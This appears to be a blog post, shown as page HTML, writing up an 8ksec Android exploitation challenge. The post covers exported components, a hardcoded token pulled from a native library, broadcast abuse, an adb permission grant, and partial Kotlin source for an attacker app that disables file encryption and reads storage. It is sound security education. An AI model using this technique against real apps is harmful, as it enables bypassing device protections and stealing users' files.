@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+>
+
+<head>
+  <meta charset="utf-8" />
+  
+    <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="rgb(255,255,255)" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <title>8ksec - AndroPseudoProtect: Ultimate Device Security &middot; Florence Njeri</title>
+    <meta name="title" content="8ksec - AndroPseudoProtect: Ultimate Device Security &middot; Florence Njeri" />
+  <meta name="description" content="Exploiting Android IPC vulnerabilities" />
+  
+  
+  
+  <link rel="canonical" href="https://florencenjeri.com/posts/andropseudoprotect/" />
+  
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.e566b6c0a0b7804755e52094f25218ae3fe33adeea50ed9df826ef64667c360685e72c0592ed510e3e76e840aaea4693f4bbbbf250fa1c16631a1a29e5c5acdf.css" integrity="sha512-5Wa2wKC3gEdV5SCU8lIYrj/jOt7qUO2d&#43;CbvZGZ8NgaF5ywFku1RDj526ECq6kaT9Lu78lD6HBZjGhop5cWs3w==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.c6198a5ecbc6c7b35a8568d29315f50cf5d775d4461c515a476359767f1a745c245aa83fa96b0c7d83da976cf77481e1fc29537a2391a53ffe69a991638802e6.js" integrity="sha512-xhmKXsvGx7NahWjSkxX1DPXXddRGHFFaR2NZdn8adFwkWqg/qWsMfYPal2z3dIHh/ClTeiORpT/&#43;aamRY4gC5g=="></script>
+  
+  
+  
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  <meta property="og:url" content="https://florencenjeri.com/posts/andropseudoprotect/">
+  <meta property="og:site_name" content="Florence Njeri">
+  <meta property="og:title" content="8ksec - AndroPseudoProtect: Ultimate Device Security">
+  <meta property="og:description" content="Exploiting Android IPC vulnerabilities">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-03-01T09:00:00+00:00">
+    <meta property="article:modified_time" content="2026-03-01T09:00:00+00:00">
+    <meta property="article:tag" content="Mobile Security">
+    <meta property="article:tag" content="Mobile Exploits">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="8ksec - AndroPseudoProtect: Ultimate Device Security">
+  <meta name="twitter:description" content="Exploiting Android IPC vulnerabilities">
+
+  
+<script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "8ksec - AndroPseudoProtect: Ultimate Device Security",
+    "headline": "8ksec - AndroPseudoProtect: Ultimate Device Security",
+    "description": "Exploiting Android IPC vulnerabilities",
+    "abstract": "\u003ch1 id=\u00228ksec---andropseudoprotect-ultimate-device-security\u0022 class=\u0022relative group\u0022\u003e8ksec - AndroPseudoProtect: Ultimate Device Security \u003cspan class=\u0022absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\u0022\u003e\u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700\u0022 style=\u0022text-decoration-line: none !important;\u0022 href=\u0022#8ksec---andropseudoprotect-ultimate-device-security\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\u003c\/span\u003e\u003c\/h1\u003e\n\u003ch2 id=\u0022exploiting-exported-components-and-bypassing-security-by-obscurity-mechanisms\u0022 class=\u0022relative group\u0022\u003eExploiting Exported Components and Bypassing Security By Obscurity Mechanisms \u003cspan class=\u0022absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\u0022\u003e\u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700\u0022 style=\u0022text-decoration-line: none !important;\u0022 href=\u0022#exploiting-exported-components-and-bypassing-security-by-obscurity-mechanisms\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\u003c\/span\u003e\u003c\/h2\u003e\n\u003cp\u003eThe goal of this exercise was to develop an android application that exploits Android\u0026rsquo;s IPC by disabling \u003ca\n  href=\u0022https:\/\/academy.8ksec.io\/path-player?courseid=android-application-exploitation-challenges\u0026amp;unit=681aad9d039a0df9de032156Unit\u0022\n  \n  target=\u0022_blank\u0022 rel=\u0022noreferrer noopener\u0022\n\u003eAndroPseudoProtect.apk\u003c\/a\u003e\u0026rsquo;s security functionality.\u003c\/p\u003e\n\u003cp\u003eMy initial thought process was that this would likely involve exploiting improperly exposed components. Specifically, if sensitive components are configured with \u003ccode\u003eexported=true\u003c\/code\u003e, an attacker application could potentially access internal functionality via \u003cstrong\u003eInter-Process Communication (IPC)\u003c\/strong\u003e, manipulate behavior, and bypass security controls. This assumption proved to be correct.\u003c\/p\u003e",
+    "inLanguage": "en",
+    "url" : "https:\/\/florencenjeri.com\/posts\/andropseudoprotect\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Florence Njeri"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-03-01T09:00:00\u002b00:00",
+    "datePublished": "2026-03-01T09:00:00\u002b00:00",
+    
+    "dateModified": "2026-03-01T09:00:00\u002b00:00",
+    
+    "keywords": ["Mobile Security","Mobile Exploits"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1295"
+  }]
+  </script>
+
+  <meta name="author" content="Florence Njeri" />
+  
+  
+
+
+
+
+
+
+  
+  
+  
+
+
+  
+</head><body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400"
+          >&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral print:hidden sm:py-10">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="z-40 flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Florence Njeri</a
+  >
+
+      
+
+    </div>
+    
+      
+      <label id="menu-button" for="menu-controller" class="block sm:hidden">
+        <input type="checkbox" id="menu-controller" class="hidden" />
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+        </div>
+        <div
+          id="menu-wrapper"
+          class="fixed inset-0 z-30 invisible w-full h-full m-auto overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50"
+        >
+          <ul
+            class="flex flex-col w-full px-6 py-6 mx-auto overflow-visible list-none max-w-7xl ltr:text-right rtl:text-left sm:px-14 sm:py-10 sm:pt-10 md:px-24 lg:px-32"
+          >
+            <li class="mb-1">
+              <span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"
+                >
+
+  <span class="relative inline-block align-text-bottom icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span
+              >
+            </li>
+            
+              
+                <li class="mb-1 group">
+                  
+                    <a
+                      href="/"
+                      title=""
+                      
+                      >
+                        <span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Home</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                <li class="mb-1 group">
+                  
+                    <a
+                      href="/posts/"
+                      title="Posts"
+                      
+                      >
+                        <span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Posts</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                <li class="mb-1 group">
+                  
+                    <a
+                      href="/now/"
+                      title="Now"
+                      
+                      >
+                        <span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Now</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                <li class="mb-1 group">
+                  
+                    <a
+                      href="/about/"
+                      title=""
+                      
+                      >
+                        <span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >About</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                <li class="mb-1 group">
+                  
+                    
+                    
+                  
+                </li>
+              
+              
+            
+          </ul>
+        </div>
+      </label>
+      
+      <ul class="flex-row hidden list-none ltr:text-right rtl:text-left sm:flex">
+        
+          
+            <li
+              class="mb-1 group sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+            >
+              
+                <a
+                  href="/"
+                  title=""
+                  
+                  >
+                    <span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Home</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            <li
+              class="mb-1 group sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+            >
+              
+                <a
+                  href="/posts/"
+                  title="Posts"
+                  
+                  >
+                    <span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Posts</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            <li
+              class="mb-1 group sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+            >
+              
+                <a
+                  href="/now/"
+                  title="Now"
+                  
+                  >
+                    <span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Now</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            <li
+              class="mb-1 group sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+            >
+              
+                <a
+                  href="/about/"
+                  title=""
+                  
+                  >
+                    <span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            <li
+              class="mb-1 group sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
+            >
+              
+                
+                
+              
+            </li>
+          
+          
+
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        8ksec - AndroPseudoProtect: Ultimate Device Security
+      </h1>
+      <div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      &lt;time datetime=&#34;2026-03-01 09:00:00 &amp;#43;0000 UTC&#34;&gt;March 1, 2026&lt;/time&gt;&lt;span class=&#34;px-2 text-primary-500&#34;&gt;&amp;middot;&lt;/span&gt;&lt;span title=&#34;Reading time&#34;&gt;7 mins&lt;/span&gt;
+    
+
+    
+    
+  </div>
+
+  
+  
+    <div class="my-1 text-xs leading-relaxed text-neutral-500 dark:text-neutral-400 ">
+      
+        
+      
+        
+          
+            <a
+              href="/tags/mobile-security/"
+              class="rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Mobile Security</a
+            >
+          
+            <a
+              href="/tags/mobile-exploits/"
+              class="rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Mobile Exploits</a
+            >
+          
+        
+      
+    </div>
+  
+
+
+      </div>
+      
+    </header>
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      <div class="min-w-0 min-h-0 max-w-prose grow">
+        <h1 id="8ksec---andropseudoprotect-ultimate-device-security" class="relative group">8ksec - AndroPseudoProtect: Ultimate Device Security <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#8ksec---andropseudoprotect-ultimate-device-security" aria-label="Anchor">#</a></span></h1>
+<h2 id="exploiting-exported-components-and-bypassing-security-by-obscurity-mechanisms" class="relative group">Exploiting Exported Components and Bypassing Security By Obscurity Mechanisms <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploiting-exported-components-and-bypassing-security-by-obscurity-mechanisms" aria-label="Anchor">#</a></span></h2>
+<p>The goal of this exercise was to develop an android application that exploits Android&rsquo;s IPC by disabling <a
+  href="https://academy.8ksec.io/path-player?courseid=android-application-exploitation-challenges&amp;unit=681aad9d039a0df9de032156Unit"
+  
+  target="_blank" rel="noreferrer noopener"
+>AndroPseudoProtect.apk</a>&rsquo;s security functionality.</p>
+<p>My initial thought process was that this would likely involve exploiting improperly exposed components. Specifically, if sensitive components are configured with <code>exported=true</code>, an attacker application could potentially access internal functionality via <strong>Inter-Process Communication (IPC)</strong>, manipulate behavior, and bypass security controls. This assumption proved to be correct.</p>
+<hr>
+<h3 id="installing-and-running-the-app" class="relative group">Installing and Running the App <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#installing-and-running-the-app" aria-label="Anchor">#</a></span></h3>
+<p>Upon launching the app, the application asks for access to all files.</p>
+<hr>
+<h3 id="static-analysis-with-jadx-findings" class="relative group">Static Analysis with Jadx Findings <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#static-analysis-with-jadx-findings" aria-label="Anchor">#</a></span></h3>
+<h4 id="1-sensitive-app-components-set-to-exportedtrue" class="relative group">1. Sensitive app components set to <code>exported=true</code> <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#1-sensitive-app-components-set-to-exportedtrue" aria-label="Anchor">#</a></span></h4>
+<p>After decompiling the APK with <strong>Jadx</strong> and looking at the <code>AndroidManifest.xml</code> file, I noted that both the <code>SecurityService</code> and <code>SecurityReceiver</code> were set to <code>exported=true</code>.</p>
+<p>This is a critical misconfiguration. When an Android component is configured as <code>exported=true</code>, it becomes accessible to other applications on the device. In the <strong>AndroPseudoProtect</strong> application, the functionality to secure the files is controlled via explicit intents sent to the <code>SecurityService</code>. Therefore, this makes it possible for an attacker to start and stop the security services by creating a malicious application that targets these components directly.</p>
+<h4 id="2-security-through-obscurity" class="relative group">2. Security Through Obscurity <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#2-security-through-obscurity" aria-label="Anchor">#</a></span></h4>
+<p>After manual analysis of the <code>SecurityService</code> file, I noted that there is a call to <code>SecurityUtils().getSecurityToken()</code>. This method retrieves a security token from a native library. The token is then validated whenever <code>startSecurity()</code> or <code>stopSecurity()</code> is invoked. The design assumption appears to be that storing the token in native code prevents attackers from accessing it.</p>
+<p>The token is used by the app to validate whether a caller is authorized to start or stop the security service. An attacker can reverse engineer the native library code to obtain the token, which would enable them to call functions to start and stop the <code>SecurityService</code> from their malicious application.</p>
+<p><strong>Extracting the token:</strong>
+To validate this assumption, I proceeded with the following steps:</p>
+<ol>
+<li>Decompiled the APK using <strong>apktool</strong>.</li>
+<li>Navigated to the <code>lib/</code> directory.</li>
+<li>Located the native <code>.so</code> file.</li>
+<li>I then reverse engineered the library using <strong>Ghidra</strong>.</li>
+<li>I identified the <code>getSecurityToken()</code> function in Ghidra.</li>
+<li>Extracted the hardcoded token: <code>8ksec_S3cr3tT0k3n_D0N0tSh4r3</code>.</li>
+</ol>
+<p>I also observed that the native library generates a log message each time the user clicks the <strong>Start Service</strong> or <strong>Stop Service</strong> buttons. These buttons internally invoke the <code>startSecurity()</code> and <code>stopSecurity()</code> functions. From the code analysis, it is clear that both functions require the security token to be passed as part of the request. The logs captured from the Android emulator confirm that the token is validated whenever these methods are executed. This behavior further verifies that the application relies on the hardcoded native token to authorize starting and stopping the security service.</p>
+<h4 id="3-listening-to-broadcasts-to-know-when-to-disable-security" class="relative group">3. Listening to broadcasts to know when to disable security <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#3-listening-to-broadcasts-to-know-when-to-disable-security" aria-label="Anchor">#</a></span></h4>
+<p>Further analysis revealed that the application sends broadcasts whenever the security service is started or stopped. Specifically:</p>
+<ul>
+<li>A broadcast is sent when the security service is started.</li>
+<li>A broadcast is sent when the security service is stopped.</li>
+</ul>
+<p>This means that any third-party application installed on the device can register a <code>BroadcastReceiver</code> and listen for the <code>ACTION_SECURITY_STARTED</code> event whenever the user enables security through the <strong>AndroPseudoProtect</strong> app.</p>
+<p>The malicious app can then use the token we obtained above to call <code>stopSecurity</code>. From the user’s perspective, security appears to be enabled; however, in reality, it has already been disabled in the background by the malicious application. This demonstrates how unprotected broadcast mechanisms can be abused to monitor application state changes and trigger automated exploitation logic without requiring any direct user interaction.</p>
+<hr>
+<h3 id="data-exfiltration-from-external-storage" class="relative group">Data Exfiltration from External Storage <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#data-exfiltration-from-external-storage" aria-label="Anchor">#</a></span></h3>
+<p>For <strong>AndroPseudoProtect</strong> to work properly, it is granted <code>READ_EXTERNAL_STORAGE</code>, <code>MANAGE_EXTERNAL_STORAGE</code>, and <code>WRITE_EXTERNAL_STORAGE</code> permissions so that the app can encrypt files located in the external storage.</p>
+<p>After the malicious app disables the encryption enforced by the <strong>AndroPseudoProtect</strong> app, the attacker can use <strong>adb</strong> to grant the malicious app permission to read from external storage:
+<code>adb shell pm grant com.example.myapplication android.permission.READ_EXTERNAL_STORAGE</code>
+and exfiltrate all the files and data stored there.</p>
+<hr>
+<h3 id="exploit-development" class="relative group">Exploit Development <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploit-development" aria-label="Anchor">#</a></span></h3>
+<p>To demonstrate the exploit, I developed a secondary Android application that:</p>
+<ol>
+<li>Listens for <code>ACTION_SECURITY_STARTED</code>.</li>
+<li>Crafts an explicit intent targeting <code>SecurityService</code> and <code>SecurityReceiver</code>.</li>
+<li>Includes the security token recovered from the <code>.so</code> file.</li>
+<li>Invokes <code>startService()</code> to stop the protection mechanism.</li>
+<li>Reads the unencrypted files from External storage and displays them in the malicious app.</li>
+</ol>
+<p>Because the target components were exported and lacked caller validation, the exploit application could interact with them as if it were the legitimate app itself. The result is a complete bypass of the application&rsquo;s encryption protection using only Android’s IPC framework.</p>
+<h4 id="malicious-app-implementation-mainactivitykt" class="relative group">Malicious App Implementation (<code>MainActivity.kt</code>) <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#malicious-app-implementation-mainactivitykt" aria-label="Anchor">#</a></span></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-kotlin" data-lang="kotlin"><span class="line"><span class="cl"><span class="k">package</span> <span class="nn">com.example.myapplication</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">android.content.BroadcastReceiver</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">android.content.ComponentName</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">android.content.Context</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">android.content.Intent</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">android.os.Bundle</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">android.os.Environment</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">android.util.Log</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">android.widget.Toast</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.activity.ComponentActivity</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.activity.compose.setContent</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.activity.enableEdgeToEdge</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.foundation.layout.Column</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.foundation.layout.fillMaxSize</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.foundation.layout.fillMaxWidth</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.foundation.layout.height</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.foundation.layout.padding</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.foundation.lazy.LazyColumn</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.foundation.lazy.items</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.material3.Button</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.material3.Scaffold</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.material3.Text</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.runtime.Composable</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.runtime.mutableStateListOf</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.ui.Modifier</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.ui.layout.ContentScale</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.ui.tooling.preview.Preview</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">androidx.compose.ui.unit.dp</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">coil.compose.AsyncImage</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">com.example.myapplication.ui.theme.MyApplicationTheme</span>
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">java.io.File</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MainActivity</span> <span class="p">:</span> <span class="n">ComponentActivity</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">companion</span> <span class="k">object</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="k">val</span> <span class="py">TARGET</span><span class="n">_PACKAGE</span> <span class="p">=</span> <span class="s2">&#34;com.eightksec.andropseudoprotect&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="k">val</span> <span class="py">RECEIVER</span><span class="n">_CLASS</span> <span class="p">=</span> <span class="s2">&#34;com.eightksec.andropseudoprotect.SecurityReceiver&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="k">val</span> <span class="py">SERVICE</span><span class="n">_CLASS</span> <span class="p">=</span> <span class="s2">&#34;com.eightksec.andropseudoprotect.SecurityService&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="k">val</span> <span class="py">ACTION</span><span class="n">_SECURITY_STARTED</span> <span class="p">=</span> <span class="s2">&#34;com.eightksec.andropseudoprotect.ACTION_SECURITY_STARTED&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="k">val</span> <span class="py">ACTION</span><span class="n">_STOP_SECURITY</span> <span class="p">=</span> <span class="s2">&#34;com.eightksec.andropseudoprotect.STOP_SECURITY&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="k">val</span> <span class="py">EXTRA</span><span class="n">_TOKEN</span> <span class="p">=</span> <span class="s2">&#34;security_token&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="k">val</span> <span class="py">SECRET</span><span class="n">_TOKEN</span> <span class="p">=</span> <span class="s2">&#34;8ksec_S3cr3tT0k3n_D0N0tSh4r3&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">val</span> <span class="py">fileList</span> <span class="p">=</span> <span class="n">mutableStateListOf</span><span class="p">&lt;</span><span class="n">String</span><span class="p">&gt;()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">val</span> <span class="py">securityStartedReceiver</span> <span class="p">=</span> <span class="k">object</span> <span class="err">: </span><span class="nc">BroadcastReceiver</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">override</span> <span class="k">fun</span> <span class="nf">onReceive</span><span class="p">(</span><span class="n">context</span><span class="p">:</span> <span class="n">Context</span><span class="p">?,</span> <span class="n">intent</span><span class="p">:</span> <span class="n">Intent</span><span class="p">?)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">intent</span><span class="o">?.</span><span class="n">action</span> <span class="o">==</span> <span class="n">ACTION_SECURITY_STARTED</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">sendStopSecurityBroadcast</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">fun</span> <span class="nf">createSecurityIntent</span><span class="p">(</span><span class="n">className</span><span class="p">:</span> <span class="n">String</span><span class="p">)</span> <span class="p">=</span> <span class="n">Intent</span><span class="p">(</span><span class="n">ACTION_STOP_SECURITY</span><span class="p">).</span><span class="n">apply</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">component</span> <span class="p">=</span> <span class="n">ComponentName</span><span class="p">(</span><span class="n">TARGET_PACKAGE</span><span class="p">,</span> <span class="n">className</span><span class="p">)</span>
